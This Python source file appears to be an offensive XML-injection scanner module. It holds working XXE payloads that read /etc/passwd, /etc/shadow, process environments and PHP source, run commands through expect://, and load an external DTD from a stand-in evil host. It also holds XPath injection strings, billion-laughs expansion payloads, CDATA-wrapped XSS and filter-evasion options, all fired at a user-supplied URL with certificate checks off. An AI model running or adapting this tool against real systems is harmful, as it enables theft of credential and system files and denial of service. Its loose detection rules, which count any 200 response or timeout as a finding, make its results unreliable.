import requests
import urllib.parse
import time
import random
from bs4 import BeautifulSoup

class XMLInjectionScanner:
    def __init__(self):
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "POST",
            "TIMEOUT": "10",
            "DELAY": "0",
            "COOKIE": "",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "XML_DATA": "",
            "RANDOM_CASE": False,
            "COMMENT_BYPASS": False,
            "CDATA_BYPASS": False,
            "ENTITY_EXPANSION": True,
            "EXTERNAL_ENTITY": True,
            "XPATH_INJECTION": True,
            "DEEP_SCAN": False
        }
        
        self.payloads = [
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><userInfo><firstName>&xxe;</firstName><lastName>test</lastName></userInfo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo><name>&xxe;</name></foo>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://example.com/evil.dtd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://example.com/evil.dtd\">]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY xxe PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://example.com/evil.dtd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://example.com/evil.dtd\">]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://example.com/evil.dtd\">%xxe;]><foo>&test;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://example.com/evil.dtd\">%xxe;]><foo>&test;</foo>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data://text/plain;base64,SSBsb3ZlIFhNTCBpbmplY3Rpb24h\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data://text/plain;base64,SSBsb3ZlIFhNTCBpbmplY3Rpb24h\">]><foo>&xxe;</foo>"
        ]
        
        self.xpath_payloads = [
            "' or '1'='1",
            "' or 1=1",
            "' or 'a'='a",
            "' or 'x'='x",
            "' or text()='x'",
            "' or name()='x'",
            "admin' or '1'='1",
            "admin' or 1=1",
            "admin' or 'a'='a",
            "admin' or 'x'='x",
            "' | //user",
            "' | //password",
            "' | /*",
            "' | //",
            "' | //*",
            "' | /",
            "'] | //* | //*[contains(text(),'",
            "')][1] | //*[contains(text(),'",
            "')][1] | //*[contains(text(),'",
            "')][1] | //*[contains(text(),'",
            "')][1] | //*[contains(text(),'"
        ]
        
        self.entity_expansion_payloads = [
            "<!DOCTYPE foo [<!ENTITY a \"aaaa\"...<!ENTITY a100 \"&a99;&a99;\"><foo>&a100;</foo>",
            "<!DOCTYPE foo [<!ENTITY a \"aaaa\"...<!ENTITY a100 \"&a99;&a99;\"><foo>&a100;</foo>",
            "<!DOCTYPE foo [<!ENTITY a \"aaaa\"...<!ENTITY a1000 \"&a999;&a999;\"><foo>&a1000;</foo>",
            "<!DOCTYPE foo [<!ENTITY a \"aaaa\"...<!ENTITY a10000 \"&a9999;&a9999;\"><foo>&a10000;</foo>",
            "<!DOCTYPE foo [<!ENTITY a \"aaaa\"...<!ENTITY a100000 \"&a99999;&a99999;\"><foo>&a100000;</foo>"
        ]
        
        self.cdata_payloads = [
            "<![CDATA[<script>alert(1)</script>]]>",
            "<![CDATA[<img src=x onerror=alert(1)>]]>",
            "<![CDATA[<svg onload=alert(1)>]]>",
            "<![CDATA[<iframe src=javascript:alert(1)>]]>",
            "<![CDATA[<body onload=alert(1)>]]>",
            "<![CDATA[<input onfocus=alert(1) autofocus>]]>",
            "<![CDATA[<select onfocus=alert(1) autofocus>]]>",
            "<![CDATA[<textarea onfocus=alert(1) autofocus>]]>",
            "<![CDATA[<keygen onfocus=alert(1) autofocus>]]>",
            "<![CDATA[<video onerror=alert(1)>]]>"
        ]
        
        self.error_patterns = [
            "XML parsing error",
            "XML declaration allowed only at the start",
            "Entity 'xxe' not defined",
            "Failed to parse XML",
            "XML document structures must start within the same entity",
            "ParseError",
            "SAXParseException",
            "xmlParseEntityRef",
            "xmlParseExternalEntity",
            "XMLReader",
            "DOMDocument",
            "SimpleXMLElement",
            "libxml2",
            "xmlSec",
            "XPATH syntax error",
            "xpath evaluation",
            "XPathException",
            "XPathQueryException"
        ]
    
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def process_payload(self, payload):
        if self.get_option("RANDOM_CASE"):
            payload = self.random_case(payload)
        
        if self.get_option("COMMENT_BYPASS"):
            payload = self.comment_bypass(payload)
        
        if self.get_option("CDATA_BYPASS"):
            payload = self.cdata_bypass(payload)
        
        return payload
    
    def random_case(self, payload):
        return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
    
    def comment_bypass(self, payload):
        return payload.replace(' ', '<!-- -->')
    
    def cdata_bypass(self, payload):
        if '<' in payload and '>' in payload:
            return f"<![CDATA[{payload}]]>"
        return payload
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        delay = int(self.get_option("DELAY"))
        
        headers = {
            "User-Agent": self.get_option("USER_AGENT"),
            "Cookie": self.get_option("COOKIE"),
            "Content-Type": "application/xml"
        }
        
        if self.get_option("HEADERS"):
            try:
                for header in self.get_option("HEADERS").split("\\n"):
                    if ":" in header:
                        key, value = header.split(":", 1)
                        headers[key.strip()] = value.strip()
            except:
                pass
        
        vulnerabilities = []
        payloads_to_test = []
        
        if self.get_option("EXTERNAL_ENTITY"):
            payloads_to_test.extend(self.payloads)
        
        if self.get_option("XPATH_INJECTION"):
            payloads_to_test.extend(self.xpath_payloads)
        
        if self.get_option("ENTITY_EXPANSION"):
            payloads_to_test.extend(self.entity_expansion_payloads)
        
        if self.get_option("CDATA_BYPASS"):
            payloads_to_test.extend(self.cdata_payloads)
        
        if self.get_option("DEEP_SCAN"):
            deep_payloads = [
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://example.com/evil.dtd\">%xxe;]><foo>&test;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/issue\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///proc/version\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///proc/self/cmdline\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///proc/self/mounts\">]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///proc/self/status\">]><foo>&xxe;</foo>"
            ]
            payloads_to_test.extend(deep_payloads)
        
        for i, payload in enumerate(payloads_to_test, 1):
            if delay > 0:
                time.sleep(delay)
            
            processed_payload = self.process_payload(payload)
            
            vulnerable, vuln_type = self.test_payload(url, param, processed_payload, method, timeout, headers)
            
            if vulnerable:
                vulnerabilities.append({
                    "payload": payload,
                    "type": vuln_type,
                    "parameter": param
                })
        
        if vulnerabilities:
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def test_payload(self, url, param, payload, method, timeout, headers):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers)
            else:
                if self.get_option("XML_DATA"):
                    try:
                        xml_data = self.get_option("XML_DATA").replace(f"{{{param}}}", payload)
                        response = requests.post(url, data=xml_data, timeout=timeout, verify=False, headers=headers)
                    except:
                        data = {param: payload}
                        response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers)
                else:
                    data = {param: payload}
                    response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers)
            
            for pattern in self.error_patterns:
                if pattern.lower() in response.text.lower():
                    return True, "XML Injection"
            
            if "root:" in response.text or "daemon:" in response.text or "[boot loader]" in response.text:
                return True, "XXE File Exfiltration"
            
            if "base64" in response.text and "PD9waHAg" in response.text:
                return True, "XXE PHP Source Code Exfiltration"
            
            if "DOCTYPE" in payload and response.status_code == 200:
                return True, "Potential XXE Injection"
            
            if "xpath" in payload.lower() and response.status_code == 200:
                return True, "XPath Injection"
            
            if "CDATA" in payload and "<script>" in response.text:
                return True, "XML CDATA Script Injection"
            
            if "ENTITY" in payload and len(response.text) > 10000:
                return True, "XML Entity Expansion Attack"
            
        except requests.exceptions.Timeout:
            return True, "Timeout-based XML Injection"
        except Exception:
            pass
        
        return False, None
